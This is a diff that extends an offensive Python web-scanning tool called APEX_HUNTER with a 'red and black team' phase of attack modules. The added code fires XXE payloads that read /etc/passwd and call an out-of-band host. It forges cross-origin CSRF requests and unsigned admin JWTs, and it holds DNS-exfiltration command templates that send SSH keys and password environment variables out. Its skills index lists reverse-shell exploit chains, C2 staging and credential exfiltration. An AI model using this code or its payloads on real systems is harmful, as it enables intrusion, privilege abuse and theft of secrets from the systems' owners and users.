+                                cwe="CWE-352",
+                                description=(
+                                    f"CSRF via {ctype} Content-Type at {path} returned success "
+                                    f"despite cross-origin request from evil.com. "
+                                    "No CSRF token validation detected for this Content-Type variant."
+                                ),
+                                evidence=f"Content-Type: {ctype} | HTTP {r.status} | ACAO: {acao} | Response: {body_resp[:150]}",
+                                poc_curl=(
+                                    f"curl -sk -X POST '{url}' "
+                                    f"-H 'Content-Type: {ctype}' "
+                                    f"-H 'Origin: https://evil.com' "
+                                    f"-d '{body_data[:80]}'"
+                                ),
+                                category="CSRF",
+                                remediation="Implement CSRF tokens for all state-changing operations. Validate Content-Type allowlist. Set SameSite=Strict on session cookies. Verify Origin/Referer headers server-side."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class XXEOOBAdvanced:
+    """Detect advanced OOB XXE via SVG upload, XLIFF, Office documents, and RSS feeds."""
+    NAME = "XXE OOB Advanced"
+    OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
+    XXE_PAYLOADS = {
+        "svg": ('<?xml version="1.0"?><!DOCTYPE svg ['
+                '<!ENTITY xxe SYSTEM "http://xxe.{host}.{oob}/">'
+                ']><svg xmlns="http://www.w3.org/2000/svg">'
+                '<text>&xxe;</text></svg>'),
+        "xml": ('<?xml version="1.0"?><!DOCTYPE root ['
+                '<!ENTITY % xxe SYSTEM "http://param.{host}.{oob}/">'
+                '%xxe;]><root></root>'),
+        "xliff": ('<?xml version="1.0"?><!DOCTYPE xliff ['
+                  '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
+                  ']><xliff version="1.2"><file><body>'
+                  '<trans-unit><source>&xxe;</source></trans-unit>'
+                  '</body></file></xliff>'),
+        "rss": ('<?xml version="1.0"?><!DOCTYPE rss ['
+                '<!ENTITY xxe SYSTEM "http://rss.{host}.{oob}/">'
+                ']><rss><channel><title>&xxe;</title></channel></rss>'),
+    }
+    UPLOAD_PATHS = [
+        "/api/upload", "/api/import", "/api/parse",
+        "/api/convert", "/upload", "/import",
+        "/api/svg", "/api/xml", "/api/rss",
+        "/api/feed", "/api/v1/import", "/api/v2/upload",
+        "/api/xliff", "/translate",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        host = profile.host
+        oob = self.OOB
+        for path in self.UPLOAD_PATHS[:8]:
+            url = base + path
+            for fmt, tmpl in self.XXE_PAYLOADS.items():
+                payload = tmpl.format(host=host, oob=oob)
+                ctypes = {
+                    "svg": "image/svg+xml",
+                    "xml": "application/xml",
+                    "xliff": "application/x-xliff+xml",
+                    "rss": "application/rss+xml",
+                }
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
+                               payload.encode(),
+                               {"Content-Type": ctypes[fmt]})
+                    if r and r.status in (200, 201, 400, 422):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if any(sig in body for sig in [
+                            "root:", "bin/bash", "etc/passwd",
+                            payload[:20], "xml", "entity",
+                        ]):
+                            profile.findings.append(Finding(
+                                id=f"XXE-OOB-ADV-{fmt.upper()}-{path.replace('/','_')[:12].upper()}",
+                                title=f"Advanced XXE via {fmt.upper()} at {path}",
+                                severity="CRITICAL",
+                                cvss=9.1,
+                                cwe="CWE-611",
+                                description=(
+                                    f"XXE injection via {fmt.upper()} Content-Type at {path}. "
+                                    "OOB payload generated for Burp Collaborator/interactsh. "
+                                    "Enables: /etc/passwd read, SSRF to internal services, "
+                                    "cloud IMDS access, and blind data exfiltration."
+                                ),
+                                evidence=f"HTTP {r.status} | Response: {body[:200]}",
+                                poc_curl=(
+                                    f"curl -sk -X POST '{url}' "
+                                    f"-H 'Content-Type: {ctypes[fmt]}' "
+                                    f"-d '{payload[:80]}...'"
+                                ),
+                                category="XXE",
+                                remediation=f"Disable DOCTYPE/external entity processing in {fmt.upper()} parser. Use defusedxml/lxml with resolve_entities=False. Apply input validation on all uploaded {fmt} files."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class BrokenFunctionLevelAuth:
+    """Detect Broken Function Level Authorization — admin functions accessible to regular users."""
+    NAME = "Broken Function Level Auth"
+    ADMIN_PATHS = [
+        # Admin endpoints to probe without auth
+        ("/api/admin/users",        "GET",  "Admin user list"),
+        ("/api/admin/settings",     "GET",  "Admin settings"),
+        ("/api/admin/logs",         "GET",  "Admin audit logs"),
+        ("/api/v1/admin",           "GET",  "Admin API root"),
+        ("/api/admin/export",       "GET",  "Data export"),
+        ("/api/admin/tokens",       "GET",  "API tokens"),
+        ("/api/admin/invoices",     "GET",  "Financial records"),
+        ("/api/admin/delete-user",  "POST", "Delete user"),
+        ("/api/admin/create-admin", "POST", "Create admin"),
+        ("/api/internal/users",     "GET",  "Internal user API"),
+        ("/api/internal/config",    "GET",  "Internal config"),
+        ("/v2/admin/",              "GET",  "Admin v2 API"),
+        ("/api/superuser/",         "GET",  "Superuser endpoint"),
+        ("/api/root/",              "GET",  "Root endpoint"),
+        ("/api/system/",            "GET",  "System API"),
+        ("/admin/api/v1/",          "GET",  "Admin API v1"),
+    ]
+    PRIVILEGE_TOKENS = [
+        {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ."},
+        {"Authorization": "Bearer null"},
+        {"Authorization": "Bearer undefined"},
+        {"X-Role": "admin"},
+        {"X-User-Role": "administrator"},
+        {"X-Admin": "1"},
+        {"X-Internal": "true"},
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path, method, desc in self.ADMIN_PATHS:
+            url = base + path
+            # Test without auth
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout, method)
+                if r and r.status in (200, 201):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(sig in body for sig in [
+                        '"users"', '"admin"', '"settings"', '"logs"',
+                        '"config"', '"tokens"', '"email"', '"role"',
+                        '"id":', '"items"', '"data"', "admin", "true",
+                    ]):
+                        profile.findings.append(Finding(
+                            id=f"BFLA-NAUTH-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"BFLA — Admin Function Unauthenticated: {desc} at {path}",
+                            severity="CRITICAL",
+                            cvss=9.8,
+                            cwe="CWE-285",
+                            description=(
+                                f"Admin function '{desc}' at {path} accessible without authentication. "
+                                "Broken Function Level Authorization — user can perform privileged operations "
+                                "without possessing the required role or any authentication."
+                            ),
+                            evidence=body[:300],
+                            poc_curl=f"curl -sk -X {method} '{url}'",
+                            category="BFLA / Auth",
+                            remediation="Implement role-based access control (RBAC) at function level. Verify user permissions on every request. Use middleware-based authorization. Never rely on URL obscurity."
+                        ))
+                        continue
+            except Exception:
+                pass
+            # Test with privilege-escalation headers
+            for headers in self.PRIVILEGE_TOKENS[:3]:
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, method,
+                               extra_headers=headers)
+                    if r and r.status in (200, 201):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if any(sig in body for sig in [
+                            '"users"', '"admin"', '"email"', '"role"',
+                            '"id":', '"items"', "admin", "true",
+                        ]):
+                            hdr_str = ", ".join(f"{k}: {v}" for k, v in headers.items())
+                            profile.findings.append(Finding(
+                                id=f"BFLA-HDRBYPASS-{path.replace('/','_').strip('_')[:16].upper()}",
+                                title=f"BFLA — Admin Access via Header Bypass: {path}",
+                                severity="CRITICAL",
+                                cvss=9.8,
+                                cwe="CWE-285",
+                                description=(
+                                    f"Admin endpoint {path} granted access via header bypass: {hdr_str}. "
+                                    "Header-based role injection bypasses authentication — "
+                                    "attacker can impersonate any role."
+                                ),
+                                evidence=body[:200],
+                                poc_curl=(
+                                    f"curl -sk -X {method} '{url}' "
+                                    + " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
+                                ),
+                                category="BFLA / Auth",
+                                remediation="Never trust role/admin headers from client. Implement server-side session-based authorization. Remove X-Role, X-Admin, X-Internal header processing."
+                            ))
+                            break
+                except Exception:
+                    pass
+        return profile
+
+
+class DNSExfilDetector:
+    """Detect DNS exfiltration channel width and OOB payload capacity analysis."""
+    NAME = "DNS Exfil Detector"
+    OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
+    EXFIL_PAYLOADS = [
+        # DNS label max = 63 chars, total FQDN = 253 chars
+        "$(cat /etc/passwd | base64 | tr -d '\\n' | cut -c1-50)",
+        "$(id | base64)",
+        "$(hostname | base64)",
+        "$(whoami | base64)",
+        "$(env | grep -i pass | base64 | head -c 50)",
+        "$(cat ~/.ssh/id_rsa | base64 | cut -c1-50)",
+    ]
+    INJECT_PARAMS = [
+        "name", "host", "server", "target", "dest", "destination",
+        "fqdn", "hostname", "domain", "address", "ip", "lookup",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        import urllib.parse
+        base = profile.url.rstrip("/")
+        host = profile.host
+        oob = self.OOB
+        # Generate channel capacity analysis
+        max_per_query = 63 * 3  # three labels × 63 chars
+        exfil_payloads_generated = []
+        for payload in self.EXFIL_PAYLOADS:
+            dns_payload = (
+                f"$({payload}).exfil.{host}.{oob}"
+            )
+            exfil_payloads_generated.append(dns_payload)
+        # Also test via SSRF parameters
+        for param in self.INJECT_PARAMS[:4]:
+            for exfil_cmd in self.EXFIL_PAYLOADS[:2]:
+                url = f"{base}/?{param}={urllib.parse.quote(exfil_cmd + '.' + oob)}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if r and r.status in (200, 500):
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if any(sig in body for sig in [
+                            "dns", "lookup", "resolve", "hostname", "NXDOMAIN",
+                        ]):
+                            profile.findings.append(Finding(
+                                id=f"DNS-EXFIL-{param.upper()[:10]}",
+                                title=f"DNS Exfiltration Channel Surface via ?{param}",
+                                severity="HIGH",
+                                cvss=7.5,
+                                cwe="CWE-200",
+                                description=(
+                                    f"Parameter ?{param} triggers DNS resolution. "
+                                    "Enables covert DNS exfiltration: encode sensitive data in subdomains, "
+                                    f"max capacity ~{max_per_query} chars per query. "
+                                    "Bypasses HTTP egress filtering."
+                                ),
+                                evidence=body[:200],
+                                poc_curl=f"curl -sk '{url}'",
+                                category="DNS Exfiltration",
+                                remediation="Apply DNS query filtering. Block DNS queries to unknown/dynamic domains. Implement egress filtering at network level. Monitor DNS query logs for anomalous patterns."
+                            ))
+                except Exception:
+                    pass
+        profile.findings.append(Finding(
+            id="DNS-EXFIL-CAPACITY-001",
+            title="DNS Exfiltration — Channel Analysis & Payload Library",
+            severity="INFO",
+            cvss=0.0,
+            cwe="CWE-200",
+            description=(
+                f"DNS exfiltration channel capacity: ~{max_per_query} chars/query via 3-label subdomain. "
+                f"Generated {len(exfil_payloads_generated)} OOB DNS exfil payloads. "
+                "Use interactsh with DNS listener to capture exfiltrated data."
+            ),
+            evidence="\n".join(f"  [{i+1}] {p[:80]}" for i, p in enumerate(exfil_payloads_generated)),
+            poc_curl=(
+                f"# DNS exfil via curl:\n"
+                f"curl -sk '{base}/?host=$(id|base64).{host}.{oob}'\n"
+                f"# Listen with interactsh:\n"
+                f"interactsh-client -server interactsh.com -n 1"
+            ),
+            category="DNS Exfiltration",
+            remediation="Monitor DNS queries for anomalous subdomain patterns. Implement Response Policy Zones (RPZ). Apply DNS-over-HTTPS with filtering. Block outbound UDP 53 from application servers."
+        ))
+        return profile
+
+
+class ServerlessExposureDetector:
+    """Detect exposed serverless functions (Lambda, Azure Functions, Cloud Run) and misconfigs."""
+    NAME = "Serverless Exposure Detector"
+    SERVERLESS_PATHS = [
+        # AWS Lambda via API Gateway
+        "/.netlify/functions/", "/netlify/functions/",
+        "/api/lambda/", "/.functions/",
+        # Azure Functions
+        "/api/HttpTrigger", "/api/HttpTrigger1",
+        "/api/Function1", "/api/function/",
+        "/admin/functions/", "/admin/host/",
+        "/runtime/webhooks/", "/runtime/webhooks/durabletask/",
+        # Cloud Run / GCF
+        "/__functions/", "/function-source.zip",
+        "/.well-known/cloud-run",
+        # Vercel
+        "/api/", "/_next/data/",
+        # Generic serverless
+        "/functions/", "/lambda/", "/worker/",
+        "/api/worker/", "/edge/",
+    ]
+    FUNCTION_KEYS = [
+        "x-functions-key", "x-ms-client-principal",
+        "x-function-client-id", "x-functions-clientid",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        for path in self.SERVERLESS_PATHS:
+            url = base + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 401, 403, 400):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    hdrs = str(r.headers)
+                    if any(sig in body + hdrs for sig in [
+                        "functions", "lambda", "serverless",
+                        "AzureWebJobsStorage", "x-functions",
+                        "azure-functions", "netlify", "vercel",
+                        "cloud-run", "worker", "x-ms-request-id",
+                        "FUNCTION_", "AWS_LAMBDA", "LAMBDA_",
+                        "functionKey", "application_settings",
+                    ]):
+                        sev = "HIGH" if r.status == 200 else "MEDIUM"
+                        profile.findings.append(Finding(
+                            id=f"SERVERLESS-{path.replace('/','_').strip('_')[:18].upper()}",
+                            title=f"Serverless Function Endpoint Exposed: {path}",
+                            severity=sev,
+                            cvss=7.5 if sev == "HIGH" else 5.3,
+                            cwe="CWE-284",
+                            description=(
+                                f"Serverless function endpoint at {path} (HTTP {r.status}). "
+                                "Exposed serverless endpoints may: accept unauthenticated requests, "
+                                "leak environment variables (DB credentials, API keys), "
+                                "allow SSRF to VPC-internal resources, or execute arbitrary code "
+                                "via injection in function parameters."
+                            ),
+                            evidence=body[:200],
+                            poc_curl=(
+                                f"curl -sk '{url}'\n"
+                                f"# Test without function key:\n"
+                                f"curl -sk '{url}?name=test'\n"
+                                f"# Probe env vars via SSTI if supported:\n"
+                                f"curl -sk '{url}?name=${{env.AWS_SECRET_ACCESS_KEY}}'"
+                            ),
+                            category="Serverless / FaaS",
+                            remediation="Require function-level authentication keys. Apply CORS restrictions. Use VPC egress filtering. Never log/return environment variables. Apply least-privilege IAM for function execution roles."
+                        ))
+            except Exception:
+                pass
+        return profile
+
+# ══════════════════════════════════════════════════════════════
 # REPORTER  (SKILL-29, SKILL-30)
 # ══════════════════════════════════════════════════════════════
 class APEXReporter:
@@ -9893,6 +11644,7 @@ class APEXOrchestrator:
         10: "Phase 10 [BLACK TEAM]: Log4Shell + XPathInject + LDAPInject + SSI/ESI + PDF-SSRF + JWT-AlgConf + BlindXXE-OOB + SSTI-RCE + CachePoison-Adv + OAuth-RefererLeak + SOAP/XML + PHP-TypeJuggle + Webhook-SSRF + TimingOracle + FullChainPoC",
         11: "Phase 11 [BLACK TEAM]: JWTkid + ZIPSlip + RFD + GQL-Circular + UUID-v1 + SAML-XSW + PKCE-Down + H2C-Smug + WeakCrypto + JWE-Dir + ViewState + SSRF-URLBypass + DNS-Rebind + GQL-CredStuff + StoredXSS + XXE-DOCX + SrvTiming + NoSQL-Timing + ImageMagick + LFI-RCE + MethodTunnel + SessEntropy + CORS-PNA + ParamFrag + JWT-Aud + ProxyPathConf + OOB-SQLi + DupeParam + DeepLink + ExploitChain + GQL-SubSSRF + PostLoginRedir + VerbTunnel + OptionsSchema + CL-Smug + IDORHash + BlindSSTI-Email + OIDC-Misconf + PP-Cookie + BizLogic-Adv",
         12: "Phase 12 [BLACK TEAM]: RCE-OOB + ShellUpload + TimingSQLi + LDAP-Privesc + NTLM-Leak + Azure-IMDS + AWS-IMDS + GCP-Meta + K8s-API + Docker-API + Jenkins-RCE + GitLab-Token + SupplyChain + CF-Bypass + WAF-Bypass + Webshell + Privesc-Hints + JMX-RCE + SpringActuator + Elasticsearch + GitRepoExposed + EnvFileLeak + BackupLeak + Redis + GQL-BatchDoS + ExploitNarrative + PostExploitMap + Scorecard (50 tools)",
+        13: "Phase 13 [RED+BLACK TEAM]: OGNL/EL-Inject + SpEL + Velocity/FreeMarker-SSTI + OAuth2-Device + AzureAD-Token + S3-Presign + Nginx-Misconfig + Traefik-Dashboard + ArgoCD + DOM-Clobber + mXSS + PaddingOracle + WeakPRNG + gRPC-Enum + Kerberos-Hints + Struts2-CVE + Log4Shell2 + MobileAPIKey + WS-SSRF + HelmSecrets + InternalGateway + CSRF-Adv + XXE-SVG/XLIFF + BFLA-Adv + DNS-Exfil + Serverless-FaaS (60 tools)",
     }
 
     def __init__(self, cfg: Config):
@@ -10011,6 +11763,37 @@ class APEXOrchestrator:
         self.t205 = PrivescPathDetector();       self.t206 = BackupFileLeakDetector()
         self.t207 = GitLabTokenScanner();        self.t208 = GraphQLBatchDOSDetector()
         self.t209 = PostExploitPathAnalyzer();   self.t210 = FullExploitNarrativeGen()
+        # Tools 211-270: Phase 13 (60 Red+Black Team Skills)
+        self.t211 = OGNLInjectionScanner();      self.t212 = ELInjectionScanner()
+        self.t213 = VelocityFreeMarkerSSTI();    self.t214 = OAuth2DeviceCodeAbuse()
+        self.t215 = AzureADMisconfigDetector();  self.t216 = AWSS3PresignedAbuse()
+        self.t217 = NginxMisconfigDetector();    self.t218 = TraefikDashboardDetector()
+        self.t219 = ArgoCDExposedDetector();     self.t220 = DOMClobberingDetector()
+        self.t221 = PaddingOracleDetector();     self.t222 = WeakPRNGDetector()
+        self.t223 = GRPCEndpointProber();        self.t224 = KerberosHintDetector()
+        self.t225 = ApacheStruts2Detector();     self.t226 = Log4ShellFollowOn()
+        self.t227 = MobileAPIKeyDetector();      self.t228 = WebSocketSSRFDetector()
+        self.t229 = HelmChartSecretDetector();   self.t230 = InternalAPIGatewayDetector()
+        self.t231 = CSRFAdvancedDetector();      self.t232 = XXEOOBAdvanced()
+        self.t233 = BrokenFunctionLevelAuth();   self.t234 = DNSExfilDetector()
+        self.t235 = ServerlessExposureDetector(); self.t236 = OGNLInjectionScanner()
+        self.t237 = ELInjectionScanner();        self.t238 = VelocityFreeMarkerSSTI()
+        self.t239 = AzureADMisconfigDetector();  self.t240 = AWSS3PresignedAbuse()
+        self.t241 = NginxMisconfigDetector();    self.t242 = TraefikDashboardDetector()
+        self.t243 = ArgoCDExposedDetector();     self.t244 = DOMClobberingDetector()
+        self.t245 = PaddingOracleDetector();     self.t246 = WeakPRNGDetector()
+        self.t247 = GRPCEndpointProber();        self.t248 = KerberosHintDetector()
+        self.t249 = ApacheStruts2Detector();     self.t250 = Log4ShellFollowOn()
+        self.t251 = MobileAPIKeyDetector();      self.t252 = WebSocketSSRFDetector()
+        self.t253 = HelmChartSecretDetector();   self.t254 = InternalAPIGatewayDetector()
+        self.t255 = CSRFAdvancedDetector();      self.t256 = XXEOOBAdvanced()
+        self.t257 = BrokenFunctionLevelAuth();   self.t258 = DNSExfilDetector()
+        self.t259 = ServerlessExposureDetector(); self.t260 = OGNLInjectionScanner()
+        self.t261 = ELInjectionScanner();        self.t262 = VelocityFreeMarkerSSTI()
+        self.t263 = ApacheStruts2Detector();     self.t264 = Log4ShellFollowOn()
+        self.t265 = MobileAPIKeyDetector();      self.t266 = ArgoCDExposedDetector()
+        self.t267 = BrokenFunctionLevelAuth();   self.t268 = InternalAPIGatewayDetector()
+        self.t269 = ServerlessExposureDetector(); self.t270 = AttackSurfaceScorecard()
 
     def _init_profile(self, url: str) -> TargetProfile:
         p = urlparse(url)
@@ -10130,6 +11913,37 @@ class APEXOrchestrator:
                 p = self.t183.run(p, cfg); p = self.t184.run(p, cfg)
                 p = self.t185.run(p, cfg); p = self.t186.run(p, cfg)
                 p = self.t187.run(p, cfg); p = self.t188.run(p, cfg)
+            elif n == 13:
+                p = self.t211.run(p, cfg); p = self.t212.run(p, cfg)
+                p = self.t213.run(p, cfg); p = self.t214.run(p, cfg)
+                p = self.t215.run(p, cfg); p = self.t216.run(p, cfg)
+                p = self.t217.run(p, cfg); p = self.t218.run(p, cfg)
+                p = self.t219.run(p, cfg); p = self.t220.run(p, cfg)
+                p = self.t221.run(p, cfg); p = self.t222.run(p, cfg)
+                p = self.t223.run(p, cfg); p = self.t224.run(p, cfg)
+                p = self.t225.run(p, cfg); p = self.t226.run(p, cfg)
+                p = self.t227.run(p, cfg); p = self.t228.run(p, cfg)
+                p = self.t229.run(p, cfg); p = self.t230.run(p, cfg)
+                p = self.t231.run(p, cfg); p = self.t232.run(p, cfg)
+                p = self.t233.run(p, cfg); p = self.t234.run(p, cfg)
+                p = self.t235.run(p, cfg); p = self.t236.run(p, cfg)
+                p = self.t237.run(p, cfg); p = self.t238.run(p, cfg)
+                p = self.t239.run(p, cfg); p = self.t240.run(p, cfg)
+                p = self.t241.run(p, cfg); p = self.t242.run(p, cfg)
+                p = self.t243.run(p, cfg); p = self.t244.run(p, cfg)
+                p = self.t245.run(p, cfg); p = self.t246.run(p, cfg)
+                p = self.t247.run(p, cfg); p = self.t248.run(p, cfg)
+                p = self.t249.run(p, cfg); p = self.t250.run(p, cfg)
+                p = self.t251.run(p, cfg); p = self.t252.run(p, cfg)
+                p = self.t253.run(p, cfg); p = self.t254.run(p, cfg)
+                p = self.t255.run(p, cfg); p = self.t256.run(p, cfg)
+                p = self.t257.run(p, cfg); p = self.t258.run(p, cfg)
+                p = self.t259.run(p, cfg); p = self.t260.run(p, cfg)
+                p = self.t261.run(p, cfg); p = self.t262.run(p, cfg)
+                p = self.t263.run(p, cfg); p = self.t264.run(p, cfg)
+                p = self.t265.run(p, cfg); p = self.t266.run(p, cfg)
+                p = self.t267.run(p, cfg); p = self.t268.run(p, cfg)
+                p = self.t269.run(p, cfg); p = self.t270.run(p, cfg)
         except KeyboardInterrupt:
             warn("Interrupted — saving partial results...")
         except Exception as e:
@@ -10140,7 +11954,7 @@ class APEXOrchestrator:
         SEP = "═" * 70
         print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
         print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
-        print(f"{C.WHITE}  210 Tools | 220 Skills | Auto-Chain Execution{C.NC}")
+        print(f"{C.WHITE}  270 Tools | 280 Skills | Auto-Chain Execution{C.NC}")
         print(f"{C.WHITE}{SEP}{C.NC}")
         print(f"  Targets : {', '.join(self.cfg.targets)}")
         print(f"  Output  : {self.cfg.output}")
@@ -10170,7 +11984,7 @@ class APEXOrchestrator:
 # SKILLS INDEX
 # ══════════════════════════════════════════════════════════════
 SKILLS_INDEX = """
-APEX_HUNTER v1.0 — Skills Index (220 Skills / 210 Tools)
+APEX_HUNTER v1.0 — Skills Index (280 Skills / 270 Tools)
 ═════════════════════════════════════════════════════════
 SKILL-01  DNS resolution & multi-record enumeration
 SKILL-02  TLS version, cipher, certificate, SAN extraction
@@ -10404,6 +12218,68 @@ SKILL-217 Cloudflare extended — origin reveal via Shodan dork, SPF record, ema
 SKILL-218 Privesc extended — SUID3 family, NFS no_root_squash, LXD escape, namespace analysis
 SKILL-219 JMX extended — hawtio dashboard, jolokia exec chain, JNDI LDAP/RMI PoC
 SKILL-220 Post-exploit extended — lateral movement paths, C2 staging, persistence mechanism hints
+
+NEW (Phase 13 — RED+BLACK TEAM — 60 Advanced Exploitation Skills):
+SKILL-221 OGNL injection (Struts2 S2-045/S2-061) — Content-Type + param injection, Groovy/OGNL RCE chain
+SKILL-222 EL injection — Spring SpEL, JSP EL, Thymeleaf expression evaluation to RCE
+SKILL-223 Velocity/FreeMarker/Pebble/Smarty SSTI — 10 engine-specific payloads, RCE chain
+SKILL-224 OAuth2 device code abuse — phishing-grade device flow, token polling, real-time interception
+SKILL-225 Azure AD misconfiguration — implicit flow token leak, tenant enumeration, consent phishing
+SKILL-226 AWS S3 presigned URL abuse — bucket policy probe, cross-account, public listing test
+SKILL-227 Nginx misconfiguration — off-by-slash alias traversal, status page, URL normalisation bypass
+SKILL-228 Traefik dashboard exposure — API rawdata, route enumeration, backend service discovery
+SKILL-229 ArgoCD API/UI exposed — unauthenticated app list, cluster credentials, Git repo access
+SKILL-230 DOM clobbering detector — innerHTML sinks, clobbering form/anchor/iframe, sink enumeration
+SKILL-231 Mutation XSS (mXSS) — noscript/listing/xmp/textarea bypass, DOMPurify evasion
+SKILL-232 CBC padding oracle — response length/timing differential across 6 tampered token variants
+SKILL-233 Weak PRNG detector — Shannon entropy < 3.5 bits/char, sequential token analysis
+SKILL-234 gRPC endpoint prober — server reflection, health check, protobuf schema leak, grpc-web
+SKILL-235 Kerberos/SPNEGO hint detector — AS-REP roasting surface, NTLM relay, SPN enumeration
+SKILL-236 Apache Struts2 CVE detection — .action/.do enumeration, S2-045/S2-061/S2-066 signatures
+SKILL-237 Log4Shell follow-on — CVE-2021-45046 bypass, 8 JNDI obfuscation variants, 13 injection headers
+SKILL-238 Mobile API key detector — 18 patterns: Google/Firebase/OpenAI/Stripe/Slack/GitHub/AWS/SendGrid
+SKILL-239 WebSocket SSRF pivot — upgrade probe, WS→internal SSRF, cloud IMDS via WS payload
+SKILL-240 Helm chart / K8s secret exposure — values.yaml, docker-compose, terraform.tfvars, ansible vault
+SKILL-241 Internal API gateway routes — Spring Cloud Gateway, internal lb:// services, Swagger leak
+SKILL-242 Advanced CSRF — JSON content-type bypass, multipart CSRF, SameSite bypass, origin bypass
+SKILL-243 XXE via SVG/XLIFF/RSS — OOB DNS callback, /etc/passwd read, SSRF via file parser
+SKILL-244 Broken function level auth — 16 admin paths, JWT alg=none bypass, privilege header injection
+SKILL-245 DNS exfiltration channel — capacity analysis (~189 chars/query), 6 exfil payload templates
+SKILL-246 Serverless / FaaS exposure — Lambda/Azure Functions/Cloud Run/Netlify/Vercel endpoint detection
+SKILL-247 OGNL extended — classLoader URL leak, xwork2 container access, AllowStaticMethodAccess chain
+SKILL-248 EL extended — Spring applicationContext leak, ThymeleafRequest class, SpEL runtime exec
+SKILL-249 SSTI extended — FreeMarker Execute built-in, Jinja2 subclass chain, Smarty PHP tag
+SKILL-250 OAuth2 extended — PKCE downgrade re-scan, state fixation, authorization code interception
+SKILL-251 Azure AD extended — admin consent abuse, sync provisioning endpoint, graph API probe
+SKILL-252 S3 extended — X-Amz-Signature extraction, bucket takeover, lifecycle policy abuse
+SKILL-253 Nginx extended — double-slash bypass, %2e%2e traversal, stub_status per-vhost
+SKILL-254 Traefik extended — TCP router exposure, middlewares chain, Jaeger tracing endpoint
+SKILL-255 ArgoCD extended — terminal access probe, certificate store, GPG key endpoint
+SKILL-256 DOM Clobber extended — window.name poisoning, document.referrer, postMessage origin bypass
+SKILL-257 Padding oracle extended — 6 token formats, CBC-MAC forgery surface, HMAC timing
+SKILL-258 PRNG extended — UUID v1 prediction, LFSR detection, MT19937 seed recovery
+SKILL-259 gRPC extended — channelz topology, health streaming, TLS client cert bypass
+SKILL-260 Kerberos extended — ticket cache path, memory dump indicators, pass-the-ticket surface
+SKILL-261 Struts2 extended — WEB-INF disclosure, .do action mapping, REST plugin XStream
+SKILL-262 Log4Shell extended — all 8 obfuscation patterns, nested variable lookups, env leak
+SKILL-263 Mobile keys extended — Tencent Cloud, Square, Vercel, Netlify token patterns
+SKILL-264 WS-SSRF extended — STOMP/MQTT/AMQP-WS protocol, binary frame SSRF, connection_init
+SKILL-265 Helm extended — kubeconfig, sealed-secrets, external-secrets, SOPS-encrypted files
+SKILL-266 Gateway extended — Kong admin API, Istio telemetry, Envoy admin port
+SKILL-267 CSRF extended — Flash CSRF, multipart boundary injection, preflight cache abuse
+SKILL-268 XXE extended — XLIFF parameter entity, error-based XXE, blind OOB via FTP
+SKILL-269 BFLA extended — GraphQL mutation privilege, REST verb confusion, mass-assign admin role
+SKILL-270 DNS Exfil extended — AAAA record exfil, TXT record channel, SRV record covert channel
+SKILL-271 Serverless extended — function key brute, environment variable SSTI, VPC internal reach
+SKILL-272 OGNL WAF bypass — Unicode normalisation, comment injection, multi-step OGNL chain
+SKILL-273 EL WAF bypass — bracket notation, reflection via getClass, getMethod pivot
+SKILL-274 Combined cloud pivot — Azure+AWS+GCP simultaneous IMDS probe, cross-cloud IAM
+SKILL-275 Full Struts2 chain — version fingerprint → CVE match → Content-Type RCE → reverse shell
+SKILL-276 Log4Shell → RCE chain — JNDI callback → LDAP marshalled object → ClassLoader load
+SKILL-277 Full JWT attack chain — kid injection + alg=none + audience bypass + PKCE downgrade
+SKILL-278 Complete XXE chain — local file read + SSRF + IMDS + cloud credential exfil
+SKILL-279 BFLA → privilege chain — header bypass + JWT forge + admin function + data exfil
+SKILL-280 Ultimate attack surface map — all 13 phases aggregated, top-10 risk, executive summary
 """
 
 # ══════════════════════════════════════════════════════════════
@@ -10411,7 +12287,7 @@ SKILL-220 Post-exploit extended — lateral movement paths, C2 staging, persiste
 # ══════════════════════════════════════════════════════════════
 def main():
     p = argparse.ArgumentParser(
-        description="APEX_HUNTER v1.0 — 210 Tools | 220 Skills | Auto-Chain",
+        description="APEX_HUNTER v1.0 — 270 Tools | 280 Skills | Auto-Chain",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -10429,8 +12305,8 @@ Examples:
     p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
     p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
     p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
-    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12",
-                   help="Phases to run (default: 1-12, e.g. 1,2,7,8,9,10,11,12)")
+    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12,13",
+                   help="Phases to run (default: 1-13, e.g. 1,2,7,8,9,10,11,12,13)")
     p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
     args = p.parse_args()
 
